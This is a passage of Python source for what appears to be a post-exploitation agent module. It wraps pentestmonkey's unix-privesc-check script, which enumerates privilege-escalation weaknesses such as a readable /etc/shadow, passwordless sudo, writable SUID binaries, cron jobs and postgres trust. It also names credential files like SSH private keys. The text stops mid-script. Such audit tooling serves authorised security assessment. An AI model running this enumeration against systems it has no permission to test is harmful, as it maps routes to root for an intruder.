class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Unix-Privesc-Check',
            'Author': ['@Killswitch_GUI', '@pentestmonkey'],
            'Description': ('This script is intended to be executed locally on'
                            'a Linux box to enumerate basic system info, and search for common' 
                            'privilege escalation vectors with a all in one shell script.'),
            'Background': False,
            'OutputExtension': "",
            'NeedsAdmin': False,
            'OpsecSafe': True,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': ['For full comments and code: http://pentestmonkey.net/tools/audit/unix-privesc-check']
        }
        self.options = {
            'Agent': {
                'Description'   :   'Agent to run on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'PrivSetting': {
                'Description'   :   'Setting to run unix-privesc-check with (standard or detailed).',
                'Required'      :   True,
                'Value'         :   'standard'
            },
            'Ip': {
                'Description'   :   'IP to curl script from (Default  is local webserver inside agent).',
                'Required'      :   True,
                'Value'         :   '127.0.0.1'
            },
            'Port': {
                'Description'   :   'Port to setup server and curl from (Default is 8089).',
                'Required'      :   True,
                'Value'         :   '8089'
            },
            'ServeCount': {
                'Description'   :   'Value to set GET request count of webserver (Can be helpful if multiple agents, only host webserver once).',
                'Required'      :   True,
                'Value'         :   '1'
            },
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        ip = self.options['Ip']['Value']
        port = self.options['Port']['Value']
        serveCount = self.options['ServeCount']['Value']
        privSetting = self.options['PrivSetting']['Value']
        url = 'http://' + str(ip) + ':' + str(port) + '/'
        script = """
import subprocess
import sys
import binascii
data = '''
VERSION="1.6"
SVNVERSION="$Revision$" # Don't change this line.  Auto-updated.
SVNVNUM=`echo $SVNVERSION | sed 's/[^0-9]//g'`
if [ -n $SVNVNUM ]; then
  VERSION="$VERSION-svn-$SVNVNUM"
fi
HOME_DIR_FILES=".exrc .netrc .ssh/id_rsa .ssh/id_dsa .rhosts .shosts .my.cnf .ssh/authorized_keys .bash_history .sh_history .forward"
CONFIG_FILES="/etc/passwd /etc/group /etc/master.passwd /etc/inittab /etc/inetd.conf /etc/xinetd.conf /etc/xinetd.d/* /etc/crontab /etc/fstab /etc/profile /etc/sudoers /etc/hosts.equiv /etc/shosts.equiv"
PGDIRS="/usr/local/pgsql/data ~postgres/postgresql/data ~postgres/data ~pgsql/data ~pgsql/pgsql/data /var/lib/postgresql/data /etc/postgresql/8.2/main /var/lib/pgsql/data"
get_owner () {
  GET_OWNER_FILE=$1
  GET_OWNER_RETURN=`ls -lLd "$GET_OWNER_FILE" | awk '{print $3}'`
}
get_group () {
  GET_GROUP_FILE=$1
  GET_GROUP_RETURN=`ls -lLd "$GET_GROUP_FILE" | awk '{print $4}'`
}
usage () {
  echo "unix-privesc-check v$VERSION ( http://pentestmonkey.net/tools/unix-privesc-check )"
  echo
  echo "Usage: unix-privesc-check { standard | detailed }"
  echo
  echo '"standard" mode: Speed-optimised check of lots of security settings.'
  echo 
  echo '"detailed" mode: Same as standard mode, but also checks perms of open file'
  echo '                 handles and called files (e.g. parsed from shell scripts,'
  echo '                 linked .so files).  This mode is slow and prone to false '
  echo '                 positives but might help you find more subtle flaws in 3rd'
  echo '                 party programs.'
  echo
  echo "This script checks file permissions and other settings that could allow"
  echo "local users to escalate privileges."
  echo 
  echo "Use of this script is only permitted on systems which you have been granted" 
  echo "legal permission to perform a security assessment of.  Apart from this "
  echo "condition the GPL v2 applies."
  echo
  echo "Search the output for the word 'WARNING'.  If you don't see it then this"
  echo "script didn't find any problems."
  echo 
}
banner () {
  echo "Starting unix-privesc-check v$VERSION ( http://pentestmonkey.net/tools/unix-privesc-check )"
  echo
  echo "This script checks file permissions and other settings that could allow"
  echo "local users to escalate privileges."
  echo 
  echo "Use of this script is only permitted on systems which you have been granted" 
  echo "legal permission to perform a security assessment of.  Apart from this "
  echo "condition the GPL v2 applies."
  echo
  echo "Search the output below for the word 'WARNING'.  If you don't see it then"
  echo "this script didn't find any problems."
  echo 
}
MODE=$1
if [ ! "$MODE" = "standard" ] && [ ! "$MODE" = "detailed" ]; then
  usage
  exit 0
fi
check_called_programs () {
  CCP_MESSAGE_STACK=$1
  CCP_FILE=$2
  CCP_USER=$3
  CCP_PATH=$4 # optional
  check_perms "$CCP_MESSAGE_STACK" "$CCP_FILE" "$CCP_USER" "$CCP_PATH"
  if [ "$MODE" = "standard" ]; then
    return 0;
  fi
  IS_TEXT=`file "$CCP_FILE" | grep -i text`
  if [ $OS = "aix" ]; then
    IS_DYNBIN=`file "$CCP_FILE" | grep -i 'object module'`
  else
    IS_DYNBIN=`file "$CCP_FILE" | grep -i 'dynamically linked'`
  fi
  if [ ! -z "$IS_TEXT" ]; then
    CALLED_FILES=`grep -v '^#' "$CCP_FILE" | sed -e 's/^[^\\/]*//' -e 's/["'\\'':}$]/\\x0a/g' | grep '/' | sed -e 's/[ \\*].*//' | grep '^/[a-zA-Z0-9_/-]*$' | sort -u`
    for CALLED_FILE in $CALLED_FILES; do
      check_perms "$CCP_MESSAGE_STACK $CCP_FILE contains the string $CALLED_FILE." "$CALLED_FILE" "$CCP_USER" "$CCP_PATH"
    done
  else
    if [ ! -z "$IS_DYNBIN" ]; then
      CALLED_FILES=`ldd "$CCP_FILE" 2>/dev/null | grep '/' | sed 's/[^\\/]*\\//\\//' | cut -f 1 -d ' ' | cut -f 1 -d '('`
      for CALLED_FILE in $CALLED_FILES; do
        check_perms "$CCP_MESSAGE_STACK $CCP_FILE uses the library $CALLED_FILE." "$CALLED_FILE" "$CCP_USER" "$CCP_PATH"
      done
      for CALLED_FILE in `strings "$CCP_FILE" | sed -e 's/^[^\\/]*//' -e 's/["'\\'':}$]/\\x0a/g' | grep '/' | sed -e 's/[ \\*].*//' | grep '^/[a-zA-Z0-9_/-]*$' | sort -u`; do
        check_perms "$CCP_MESSAGE_STACK $CCP_FILE contains the string $CALLED_FILE." "$CALLED_FILE" "$CCP_USER" "$CCP_PATH"
      done
    fi
  fi
}
check_called_programs_suid_sgid () {
  CCP_FILE=$1
  is_suid $CCP_FILE # sets $IS_SUID_RETURN
  if [ "$IS_SUID_RETURN" -eq 1 ]; then
    check_called_programs_suid $CCP_FILE
  fi
  is_sgid $CCP_FILE # sets $IS_SGID_RETURN
  if [ "$IS_SGID_RETURN" -eq 1 ]; then
    check_called_programs_sgid $CCP_FILE
  fi
}
check_called_programs_suid () {
  CCP_FILE=$1
  CCP_PATH=$2 # optional
  get_owner $CCP_FILE; CCP_USER=$GET_OWNER_RETURN
  CCP_MESSAGE_STACK="$CCP_FILE is SUID $CCP_USER."
  LS=`ls -l $CCP_FILE`
  echo "Checking SUID-$CCP_USER program $CCP_FILE: $LS"
  IS_TEXT=`file "$CCP_FILE" | grep -i text`
  IS_DYNBIN=`file "$CCP_FILE" | grep -i 'dynamically linked'`
  if [ ! -z "$IS_TEXT" ]; then
    if [ "$MODE" = "standard" ]; then
      return 0;
    fi
    CALLED_FILES=`grep -v '^#' "$CCP_FILE" | sed -e 's/^[^\\/]*//' -e 's/["'\\'':}$]/\\x0a/g' | grep '/' | sed -e 's/[ \\*].*//' | grep '^/[a-zA-Z0-9_/-]*$' | sort -u`
    for CALLED_FILE in $CALLED_FILES; do
      check_perms "$CCP_MESSAGE_STACK $CCP_FILE contains the string $CALLED_FILE." "$CALLED_FILE" root "$CCP_PATH"
    done
  else
    if [ ! -z "$IS_DYNBIN" ]; then
      CALLED_FILES=`ldd "$CCP_FILE" 2>/dev/null | grep '/' | sed 's/[^\\/]*\\//\\//' | cut -f 1 -d ' '`
      for CALLED_FILE in $CALLED_FILES; do
        check_perms "$CCP_MESSAGE_STACK $CCP_FILE uses the library $CALLED_FILE." "$CALLED_FILE" root "$CCP_PATH"
      done
      if [ "$MODE" = "standard" ]; then
        return 0;
      fi
      for CALLED_FILE in `strings "$CCP_FILE" | sed -e 's/^[^\\/]*//' -e 's/["'\\'':}$]/\\x0a/g' | grep '/' | sed -e 's/[ \\*].*//' | grep '^/[a-zA-Z0-9_/-]*$' | sort -u`; do
        check_perms "$CCP_MESSAGE_STACK $CCP_FILE contains the string $CALLED_FILE." "$CALLED_FILE" root "$CCP_PATH"
      done
    fi
  fi
}
check_called_programs_sgid () {
  CCP_FILE=$1
  CCP_PATH=$2 # optional
  get_group $CCP_FILE; CCP_GROUP=$GET_GROUP_RETURN
  CCP_MESSAGE_STACK="$CCP_FILE is SGID $CCP_GROUP."
  LS=`ls -l $CCP_FILE`
  echo "Checking SGID-$CCP_GROUP program $CCP_FILE: $LS"
  IS_TEXT=`file "$CCP_FILE" | grep -i text`
  IS_DYNBIN=`file "$CCP_FILE" | grep -i 'dynamically linked'`
  if [ ! -z "$IS_TEXT" ]; then
    if [ "$MODE" = "standard" ]; then
      return 0;
    fi
    CALLED_FILES=`grep -v '^#' "$CCP_FILE" | sed -e 's/^[^\\/]*//' -e 's/["'\\'':}$]/\\x0a/g' | grep '/' | sed -e 's/[ \\*].*//' | grep '^/[a-zA-Z0-9_/-]*$' | sort -u`
    for CALLED_FILE in $CALLED_FILES; do
      check_perms "$CCP_MESSAGE_STACK $CCP_FILE contains the string $CALLED_FILE." "$CALLED_FILE" root "$CCP_PATH"
    done
  else
    if [ ! -z "$IS_DYNBIN" ]; then
      CALLED_FILES=`ldd "$CCP_FILE" 2>/dev/null | grep '/' | sed 's/[^\\/]*\\//\\//' | cut -f 1 -d ' '`
      for CALLED_FILE in $CALLED_FILES; do
        check_perms "$CCP_MESSAGE_STACK $CCP_FILE uses the library $CALLED_FILE." "$CALLED_FILE" root "$CCP_PATH"
      done
      if [ "$MODE" = "standard" ]; then
        return 0;
      fi
      for CALLED_FILE in `strings "$CCP_FILE" | sed -e 's/^[^\\/]*//' -e 's/["'\\'':}$]/\\x0a/g' | grep '/' | sed -e 's/[ \\*].*//' | grep '^/[a-zA-Z0-9_/-]*$' | sort -u`; do
        check_perms "$CCP_MESSAGE_STACK $CCP_FILE contains the string $CALLED_FILE." "$CALLED_FILE" root "$CCP_PATH"
      done
    fi
  fi
}
check_called_programs_fscaps () {
  CCP_FILE=$1
  CCP_PATH=$2 # optional
  CCP_MESSAGE_STACK="$CCP_FILE has fscaps."
  LS=`ls -l $CCP_FILE`
  echo "Checking fscaps program $CCP_FILE: $LS"
  IS_TEXT=`file "$CCP_FILE" | grep -i text`
  IS_DYNBIN=`file "$CCP_FILE" | grep -i 'dynamically linked'`
  if [ ! -z "$IS_TEXT" ]; then
    if [ "$MODE" = "standard" ]; then
      return 0;
    fi
    CALLED_FILES=`grep -v '^#' "$CCP_FILE" | sed -e 's/^[^\\/]*//' -e 's/["'\\'':}$]/\\x0a/g' | grep '/' | sed -e 's/[ \\*].*//' | grep '^/[a-zA-Z0-9_/-]*$' | sort -u`
    for CALLED_FILE in $CALLED_FILES; do
      check_perms "$CCP_MESSAGE_STACK $CCP_FILE contains the string $CALLED_FILE." "$CALLED_FILE" "root" "$CCP_PATH"
    done
  else
    if [ ! -z "$IS_DYNBIN" ]; then
      CALLED_FILES=`ldd "$CCP_FILE" 2>/dev/null | grep '/' | sed 's/[^\\/]*\\//\\//' | cut -f 1 -d ' '`
      for CALLED_FILE in $CALLED_FILES; do
        check_perms "$CCP_MESSAGE_STACK $CCP_FILE uses the library $CALLED_FILE." "$CALLED_FILE" "root" "$CCP_PATH"
      done
      if [ "$MODE" = "standard" ]; then
        return 0;
      fi
      for CALLED_FILE in `strings "$CCP_FILE" | sed -e 's/^[^\\/]*//' -e 's/["'\\'':}$]/\\x0a/g' | grep '/' | sed -e 's/[ \\*].*//' | grep '^/[a-zA-Z0-9_/-]*$' | sort -u`; do
        check_perms "$CCP_MESSAGE_STACK $CCP_FILE contains the string $CALLED_FILE." "$CALLED_FILE" "root" "$CCP_PATH"
      done
    fi
  fi
}
check_perms () {
  CP_MESSAGE_STACK=$1
  CHECK_PERMS_FILE=$2
  CHECK_PERMS_USER=$3
  CHECK_PERMS_PATH=$4 # optional
  if [ ! -f "$CHECK_PERMS_FILE" ] && [ ! -d "$CHECK_PERMS_FILE" ] && [ ! -b "$CHECK_PERMS_FILE" ] && [ ! -c "$CHECK_PERMS_FILE" ]; then
    CHECK_PERMS_FOUND=0
    if [ ! -z "$CHECK_PERMS_PATH" ]; then 
      for DIR in `echo "$CHECK_PERMS_PATH" | sed 's/:/ /g'`; do
        if [ -f "$DIR/$CHECK_PERMS_FILE" ]; then
          CHECK_PERMS_FOUND=1
          CHECK_PERMS_FILE="$DIR/$CHECK_PERMS_FILE"
          break
        fi
      done
    fi
  fi
  C=`echo "$CHECK_PERMS_FILE" | cut -c 1`
  if [ ! "$C" = "/" ]; then
    echo "ERROR: Can't find absolute path for $CHECK_PERMS_FILE.  Skipping."
    return 0
  fi
  echo "    Checking if anyone except $CHECK_PERMS_USER can change $CHECK_PERMS_FILE"
  while [ -n "$CHECK_PERMS_FILE" ]; do
    perms_secure "$CP_MESSAGE_STACK" $CHECK_PERMS_FILE $CHECK_PERMS_USER
    CHECK_PERMS_FILE=`echo $CHECK_PERMS_FILE | sed 's/\\/[^\\/]*$//'`
  done
}
check_read_perms () {
  CP_MESSAGE_STACK=$1
  CHECK_PERMS_FILE=$2
  CHECK_PERMS_USER=$3
  if [ ! -f "$CHECK_PERMS_FILE" ] && [ ! -b "$CHECK_PERMS_FILE" ] && [ ! -c "$CHECK_PERMS_FILE" ]; then
    echo "ERROR: File $CHECK_PERMS_FILE doesn't exist"
    return 0
  fi
  echo "    Checking if anyone except $CHECK_PERMS_USER can read file $CHECK_PERMS_FILE"
  perms_secure_read "$CP_MESSAGE_STACK" "$CHECK_PERMS_FILE" "$CHECK_PERMS_USER"
}
perms_secure_read () {
  PS_MESSAGE_STACK=$1
  PERMS_SECURE_FILE=$2
  PERMS_SECURE_USER=$3
  if [ ! -b "$PERMS_SECURE_FILE" ] && [ ! -f "$PERMS_SECURE_FILE" ] && [ ! -d "$PERMS_SECURE_FILE" ] && [ ! -c "$PERMS_SECURE_FILE" ]; then
    echo "ERROR: No such file or directory: $PERMS_SECURE_FILE.  Skipping."
    return 0
  fi
  only_user_can_read "$PS_MESSAGE_STACK" $PERMS_SECURE_FILE $PERMS_SECURE_USER
  group_can_read "$PS_MESSAGE_STACK" $PERMS_SECURE_FILE $PERMS_SECURE_USER
  world_can_read "$PS_MESSAGE_STACK" $PERMS_SECURE_FILE
}
perms_secure () {
  PS_MESSAGE_STACK=$1
  PERMS_SECURE_FILE=$2
  PERMS_SECURE_USER=$3
  if [ ! -d "$PERMS_SECURE_FILE" ] && [ ! -f "$PERMS_SECURE_FILE" ] && [ ! -b "$PERMS_SECURE_FILE" ] && [ ! -c "$PERMS_SECURE_FILE" ]; then
    return 0
  fi
  only_user_can_write "$PS_MESSAGE_STACK" $PERMS_SECURE_FILE $PERMS_SECURE_USER
  group_can_write "$PS_MESSAGE_STACK" $PERMS_SECURE_FILE $PERMS_SECURE_USER
  world_can_write "$PS_MESSAGE_STACK" $PERMS_SECURE_FILE
}
only_user_can_write () {
  O_MESSAGE_STACK=$1
  O_FILE=$2
  O_USER=$3
  get_owner $O_FILE; O_FILE_USER=$GET_OWNER_RETURN
  if [ ! "$O_USER" = "$O_FILE_USER" ] && [ ! "$O_FILE_USER" = "root" ]; then
    echo "[UPC001] WARNING: $O_MESSAGE_STACK The user $O_FILE_USER can write to $O_FILE"
  fi
}
group_can_write () {
  O_MESSAGE_STACK=$1
  O_FILE=$2
  O_USER=$3 # ignore group write access $3 is only member of group
  get_group $O_FILE; O_FILE_GROUP=$GET_GROUP_RETURN
  P=`ls -lLd $O_FILE | cut -c 6`
  if [ "$P" = "w" ] && [ ! "$O_GROUP" = "root" ]; then
    group_has_other_members "$O_FILE_GROUP" "$O_USER"; # sets OTHER_MEMBERS to 1 or 0
    if [ "$OTHER_MEMBERS" = "1" ]; then
      echo "[UPC002] WARNING: $O_MESSAGE_STACK The group $O_FILE_GROUP can write to $O_FILE"
    fi
  fi
}
is_suid () {
  O_FILE=$1
  P=`ls -lLd $O_FILE | cut -c 4`
  if [ "$P" = "s" ]; then
    IS_SUID_RETURN=1
  else
    IS_SUID_RETURN=0
  fi
}
is_sgid () {
  O_FILE=$1
  P=`ls -lLd $O_FILE | cut -c 7`
  if [ "$P" = "s" ]; then
    IS_SGID_RETURN=1
  else
    IS_SGID_RETURN=0
  fi
}
group_has_other_members () {
  G_GROUP=$1
  G_USER=$2
  if [ "$EXT_AUTH" = 1 ]; then
    OTHER_MEMBERS=1
    return 1
  fi
  GROUP_LINE=`grep "^$G_GROUP:" /etc/group`
  MEMBERS=`echo "$GROUP_LINE" | cut -f 4 -d : | sed 's/,/ /g'`
  GID=`echo "$GROUP_LINE" | cut -f 3 -d :`
  EXTRA_MEMBERS=`grep "^[^:]*:[^:]*:[0-9]*:$GID:" /etc/passwd | cut -f 1 -d : | xargs echo`
  for M in $MEMBERS; do
    if [ ! "$M" = "$G_USER" ] && [ ! "$M" = "root" ]; then
      OTHER_MEMBERS=1
      return 1
    fi
  done
  for M in $EXTRA_MEMBERS; do
    if [ ! "$M" = "$G_USER" ] && [ ! "$M" = "root" ]; then
      OTHER_MEMBERS=1
      return 1
    fi
  done
  OTHER_MEMBERS=0
  return 0
}
world_can_write () {
  O_MESSAGE_STACK=$1
  O_FILE=$2
  P=`ls -lLd $O_FILE | cut -c 9`
  S=`ls -lLd $O_FILE | cut -c 10`
  if [ "$P" = "w" ]; then
    if [ "$S" = "t" ]; then
      echo "[UPC003] WARNING: $O_MESSAGE_STACK World write is set for $O_FILE (but sticky bit set)"
    else
      echo "[UPC004] WARNING: $O_MESSAGE_STACK World write is set for $O_FILE"
    fi
  fi
}
only_user_can_read () {
  O_MESSAGE_STACK=$1
  O_FILE=$2
  O_USER=$3
  get_owner $O_FILE; O_FILE_USER=$GET_OWNER_RETURN
  if [ ! "$O_USER" = "$O_FILE_USER" ] && [ ! "$O_FILE_USER" = "root" ]; then
    echo "[UPC005] WARNING: $O_MESSAGE_STACK The user $O_FILE_USER can read $O_FILE"
  fi
}
group_can_read () {
  O_MESSAGE_STACK=$1
  O_FILE=$2
  O_USER=$3
  get_group $O_FILE; O_FILE_GROUP=$GET_GROUP_RETURN
  P=`ls -lLd $O_FILE | cut -c 5`
  if [ "$P" = "r" ] && [ ! "$O_GROUP" = "root" ]; then
    group_has_other_members "$O_FILE_GROUP" "$O_USER"; # sets OTHER_MEMBERS to 1 or 0
    if [ "$OTHER_MEMBERS" = "1" ]; then
      echo "[UPC006] WARNING: $O_MESSAGE_STACK The group $O_FILE_GROUP can read $O_FILE"
    fi
  fi
}
world_can_read () {
  O_MESSAGE_STACK=$1
  O_FILE=$2
  P=`ls -lLd $O_FILE | cut -c 8`
  if [ "$P" = "w" ]; then
    echo "[UPC007] WARNING: $O_MESSAGE_STACK World read is set for $O_FILE"
  fi
}
section () {
  echo
  echo '############################################'
  echo $1
  echo '############################################'
}
if [ -x /usr/bin/showrev ]; then
  OS="solaris"
  SHADOW="/etc/shadow"
elif [ -x /usr/sbin/sam -o -x /usr/bin/sam ]; then
  OS="hpux"
  SHADOW="/etc/shadow"
elif [ -f /etc/master.passwd ]; then
  OS="bsd"
  SHADOW="/etc/master.passwd"
elif [ -f /etc/security/user ]; then
  OS="aix"
  SHADOW="/etc/security/passwd"
else
  OS="linux"
  SHADOW="/etc/shadow"
fi
echo "Assuming the OS is: $OS"
CONFIG_FILES="$CONFIG_FILES $SHADOW"
PATH=$PATH:/usr/bin:/bin:/sbin:/usr/sbin; export PATH
PROGS="ls awk grep cat mount xargs file ldd strings"
for PROG in $PROGS; do
  which $PROG 2>&1 > /dev/null
  if [ ! $? = "0" ]; then
    echo "ERROR: Dependend program '$PROG' is mising.  Can't run.  Sorry!"
    exit 1
  fi
done
banner
section "Recording hostname"
hostname
section "Recording uname"
uname -a
section "Recording Interface IP addresses"
if [ "$OS" = "hpux" ]; then
  for IFACE in `lanscan | grep x | awk '{print $5}' 2>/dev/null`; do
    ifconfig $IFACE 2>/dev/null
  done
else
  ifconfig -a
fi
section "Checking if external authentication is allowed in /etc/passwd"
FLAG=`grep '^+:' /etc/passwd`
if [ -n "$FLAG" ]; then
  echo "[UPC008] WARNING: /etc/passwd allows external authentcation:"
  grep '^+' /etc/passwd
  EXT_AUTH=1
else
  echo "No +:... line found in /etc/passwd"
fi
section "Checking nsswitch.conf/netsvc.conf for addition authentication methods"
if [ "$OS" = "aix" ]; then
  if [ -r "/etc/netsvc.conf" ]; then
    NIS=`grep '^host' /etc/netsvc.conf | grep 'nis'`
    if [ -n "$NIS" ]; then
      echo "[UPC009] WARNING: NIS is used for authentication on this system"
      EXT_AUTH=1
    fi
    LDAP=`grep '^host' /etc/netsvc.conf | grep 'ldap'`
    if [ -n "$LDAP" ]; then
      echo "[UPC010] WARNING: LDAP is used for authentication on this system"
      EXT_AUTH=1
    fi
  else
    echo "ERROR: File /etc/netsvc.conf isn't readable.  Skipping checks."
  fi
else
  if [ -r "/etc/nsswitch.conf" ]; then
    NIS=`grep '^passwd' /etc/nsswitch.conf  | grep 'nis'`
    if [ -n "$NIS" ]; then
      echo "[UPC011] WARNING: NIS is used for authentication on this system"
      EXT_AUTH=1
    fi
    LDAP=`grep '^passwd' /etc/nsswitch.conf  | grep 'ldap'`
    if [ -n "$LDAP" ]; then
      echo "[UPC012] WARNING: LDAP is used for authentication on this system"
      EXT_AUTH=1
    fi
    if [ -z "$NIS" ] && [ -z "$LDAP" ]; then
      echo "Neither LDAP nor NIS are used for authentication"
    fi
  else
    echo "ERROR: File /etc/nsswitch.conf isn't readable.  Skipping checks."
  fi
fi
section "Checking for writable config files"
for FILE in $CONFIG_FILES; do
  if [ -f "$FILE" ]; then
    check_perms "$FILE is a critical config file." "$FILE" root
  fi
done
section "Checking if $SHADOW is readable"
check_read_perms "$SHADOW holds authentication data" $SHADOW root
section "Checking if $SHADOW is writable"
check_perms "$SHADOW can be written to" $SHADOW root
section "Checking if /etc/passwd is writable"
check_perms "/etc/passwd can be written to" /etc/passwd root
section "Checking for password hashes in /etc/passwd"
FLAG=`grep -v '^[^:]*:[!x\\*]*:' /etc/passwd | grep -v '^#'`
if [ -n "$FLAG" ]; then
  echo "[UPC013] WARNING: There seem to be some password hashes in /etc/passwd"
  grep -v '^[^:]*:[!x\\*]*:' /etc/passwd | grep -v '^#'
  EXT_AUTH=1
else
  echo "No password hashes found in /etc/passwd"
fi
section "Checking account settings"
if [ -r "/etc/passwd" ]; then
  OPEN=`grep "^[^:][^:]*::" /etc/passwd | cut -f 1 -d ":"`
  if [ -n "$OPEN" ]; then
    echo "[UPC014] WARNING: The following accounts have no password:"
    grep "^[^:][^:]*::" /etc/passwd | cut -f 1 -d ":"
  fi
fi
if [ -r "$SHADOW" ]; then
  echo "Checking for accounts with no passwords"
  if [ "$OS" = "linux" ]; then
    passwd -S -a | while read LINE
    do
      USER=`echo "$LINE" | awk '{print $1}'`
      STATUS=`echo "$LINE" | awk '{print $2}'`
      if [ "$STATUS" = "NP" ]; then
        echo "[UPC015] WARNING: User $USER doesn't have a password"
      fi
    done
  elif [ "$OS" = "solaris" ]; then
    passwd -s -a | while read LINE
    do
      USER=`echo "$LINE" | awk '{print $1}'`
      STATUS=`echo "$LINE" | awk '{print $2}'`
      if [ "$STATUS" = "NP" ]; then
        echo "[UPC016] WARNING: User $USER doesn't have a password"
      fi
    done
  fi
else
  echo "File $SHADOW isn't readable.  Skipping some checks."
fi
section "Checking library directories from /etc/ld.so.conf"
if [ -f "/etc/ld.so.conf" ] && [ -r "/etc/ld.so.conf" ]; then
  for DIR in `grep '^/' /etc/ld.so.conf`; do
    check_perms "$DIR is in /etc/ld.so.conf." $DIR root
  done
else
  echo "File /etc/ld.so.conf not present.  Skipping checks."
fi
section "Checking sudo configuration"
if [ -f "/etc/sudoers" ] && [ -r "/etc/sudoers" ]; then
  echo -----------------
  echo "Checking if sudo is configured"
  SUDO_USERS=`grep -v '^#' /etc/sudoers | grep -v '^[ \\t]*$' | grep -v '^[ \\t]*Default' | grep =`
  if [ ! -z "$SUDO_USERS" ]; then
    echo "[UPC017] WARNING: Sudo is configured.  Manually check nothing unsafe is allowed:"
    grep -v '^#' /etc/sudoers | grep -v '^[ \\t]*$' | grep = | grep -v '^[ \\t]*Default'
  fi
  echo -----------------
  echo "Checking sudo users need a password"
  SUDO_NOPASSWD=`grep -v '^#' /etc/sudoers | grep -v '^[ \\t]*$' | grep NOPASSWD`
  if [ ! -z "$SUDO_NOPASSWD" ]; then
    echo "[UPC018] WARNING: Some users can use sudo without a password:"
    grep -v '^#' /etc/sudoers | grep -v '^[ \\t]*$' | grep NOPASSWD
  fi
else
  echo "File /etc/sudoers not present.  Skipping checks."
fi
section "Checking permissions on swap file(s)"
if [ "$OS" = "hpux" ]; then
  for SWAP in `swapinfo| grep -v '^dev' | awk '{print $9}'`; do
    check_perms "$SWAP is used for swap space." $SWAP root
    check_read_perms "$SWAP is used for swap space." $SWAP root
  done
else
  if [ "$OS" != "aix" ]; then
    for SWAP in `swapon -s | grep -v '^Filename' | cut -f 1 -d ' '`; do
      check_perms "$SWAP is used for swap space." $SWAP root  
      check_read_perms "$SWAP is used for swap space." $SWAP root     
    done
  fi
fi
section "Checking programs run from inittab"
if [ -f "/etc/inittab" ] && [ -r "/etc/inittab" ]; then
  for FILE in `cat /etc/inittab | grep : | grep -v '^#' | cut -f 4 -d : | grep '/' | cut -f 1 -d ' ' | sort -u`; do
    check_called_programs "$FILE is run from /etc/inittab as root." $FILE root
  done
else
  echo "File /etc/inittab not present.  Skipping checks."
fi
section "Checking postgres trust relationships"
for DIR in $PGDIRS; do
  if [ -d "$DIR" ] && [ -r "$DIR/pg_hba.conf" ]; then
    grep -v '^#' "$DIR/pg_hba.conf" | grep -v '^[ \\t]*$' | while read LINE
    do
      AUTH=`echo "$LINE" | awk '{print $NF}'`
      if [ "$AUTH" = "trust" ]; then
        PGTRUST=1
        echo "[UPC019] WARNING: Postgres trust configured in $DIR/pg_hba.conf: $LINE"
      fi
    done
  fi
done
PGVER1=`psql -U postgres template1 -c 'select version()' 2>/dev/null | grep version`
if [ -n "$PGVER1" ]; then 
  PGTRUST=1
  echo "[UPC020] WARNING: Can connect to local postgres database as \\"postgres\\" without a password"
fi
PGVER2=`psql -U pgsql template1 -c 'select version()' 2>/dev/null | grep version`
if [ -n "$PGVER2" ]; then 
  PGTRUST=1
  echo "[UPC021] WARNING: Can connect to local postgres database as \\"pgsql\\" without a password"
fi
if [ -z "$PGTRUST" ]; then
  echo "No postgres trusts detected"
fi
section "Checking permissions on device files for mounted partitions"
if [ "$OS" = "linux" ]; then
  mount | while read LINE
  do
    DEVICE=`echo "$LINE" | awk '{print $1}'`
    FS=`echo "$LINE" | awk '{print $5}'`
    if [ "$FS" = "ext2" ] || [ "$FS" = "ext3" ] ||[  "$FS" = "reiserfs" ]; then
      echo "Checking device $DEVICE"
      check_perms "$DEVICE is a mounted file system." $DEVICE root
    fi
  done
elif [ "$OS" = "bsd" ]; then
  mount | grep ufs | while read LINE
  do
    DEVICE=`echo "$LINE" | awk '{print $1}'`
    echo "Checking device $DEVICE"
    check_perms "$DEVICE is a mounted file system." $DEVICE root
  done
elif [ "$OS" = "solaris" ]; then
  mount | grep xattr | while read LINE
  do
    DEVICE=`echo "$LINE" | awk '{print $3}'`
    if [ ! "$DEVICE" = "swap" ]; then
      echo "Checking device $DEVICE"
      check_perms "$DEVICE is a mounted file system." $DEVICE root
    fi
  done
  NFS=`mount -v | grep  -i ' nfs '`
  if [ -n "$NFS" ]; then
    echo "[UPC022] WARNING: This system is an NFS client.  Check for nosuid and nodev options."
    mount -v | grep -i NFS
  fi
elif [ "$OS" = "hpux" ]; then
  mount | while read LINE
  do
    DEVICE=`echo "$LINE" | awk '{print $3}'`
    C=`echo $DEVICE | cut -c 1`
    if [ "$C" = "/" ]; then
      echo "Checking device $DEVICE"
      check_perms "$DEVICE is a mounted file system." $DEVICE root
    fi
  done
  NFS=`mount | grep NFS`
  if [ -n "$NFS" ]; then
    echo "[UPC022] WARNING: This system is an NFS client.  Check for nosuid and nodev options."
    mount | grep NFS
  fi
elif [ "$OS" = "aix" ]; then
  mount | grep jfs2 | while read DEVICE LINE
  do
    echo "Checking device $DEVICE"
    check_perms "$DEVICE is a mounted file system." $DEVICE root
  done
fi
section "Checking cron job programs aren't writable (/etc/crontab)"
CRONDIRS=""
if [ -f "/etc/crontab" ] && [ -r "/etc/crontab" ]; then
  MYPATH=`grep '^PATH=' /etc/crontab | cut -f 2 -d = `
  echo Crontab path is $MYPATH
  CRONDIRS=`grep -v '^#' /etc/crontab | grep -v '^[ \\t]*$' | grep '[ \\t][^ \\t][^ \\t]*[ \\t][ \\t]*' | grep run-crons`
  grep -v '^#' /etc/crontab | grep -v '^[ \\t]*$' | grep '[ \\t][^ \\t][^ \\t]*[ \\t][ \\t]*' | grep run-parts | while read LINE
  do
    echo "Processing crontab run-parts entry: $LINE"
    USER=`echo "$LINE" | awk '{print $6}'`
    DIR=`echo "$LINE" | sed 's/.*run-parts[^()&|;\\/]*\\(\\/[^ ]*\\).*/\\1/'`
    check_perms "$DIR holds cron jobs which are run as $USER." "$DIR" "$USER"
    if [ -d "$DIR" ]; then
      echo "    Checking directory: $DIR"
      for FILE in $DIR/*; do
        FILENAME=`echo "$FILE" | sed 's/.*\\///'`
        if [ "$FILENAME" = "*" ]; then 
          echo "    No files in this directory."
          continue
        fi
        check_called_programs "$FILE is run by cron as $USER." "$FILE" "$USER"
      done
    fi
  done
  grep -v '^#' /etc/crontab | grep -v '^[   ]*$' | grep '[  ][^   ][^   ]*[   ][  ]*' | while read LINE
  do 
